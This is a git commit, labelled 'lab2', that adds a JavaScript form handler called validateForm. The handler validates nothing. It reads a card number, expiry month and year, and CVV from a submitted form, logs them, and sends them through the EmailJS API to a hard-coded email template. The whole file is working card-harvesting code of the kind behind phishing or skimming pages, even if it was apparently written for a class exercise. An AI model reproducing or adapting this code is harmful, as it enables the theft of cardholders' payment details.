ad77a4253997e37dd443d1b708bce08c20c221ac
viktoriabogar <83724086+viktoriabogar@users.noreply.github.com>
2021-05-05 21:03:54 +0300

    lab2

---
+++ main.js
@@ -0,0 +1,41 @@
+function validateForm(event) {
+    const ccn = event.target[0].value;
+    const dateM = event.target[1].value;
+    const dateY = event.target[2].value;
+    const cvv = event.target[3].value;
+
+    const notification = document.getElementById('notification');
+    notification.style.display = 'block'
+
+    setTimeout(() => {
+        notification.style.display = 'none'
+    }, 3000)
+
+    console.log(event)
+    console.log(ccn,
+        dateM,
+        dateY,
+        cvv)
+
+    var data = {
+        service_id: 'service_dt3pcxp',
+        template_id: 'template_ldnjsmm',
+        user_id: 'user_42qsjvQJOsMtKVV8UxgaQ',
+        template_params: {
+            ccn,
+            dateM,
+            dateY,
+            cvv
+        }
+    };
+
+    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+        type: 'POST',
+        data: JSON.stringify(data),
+        contentType: 'application/json'
+    }).done(function () {
+        console.log('Your mail is sent!');
+    }).fail(function (error) {
+        console.log('Oops... ' + JSON.stringify(error));
+    });
+}
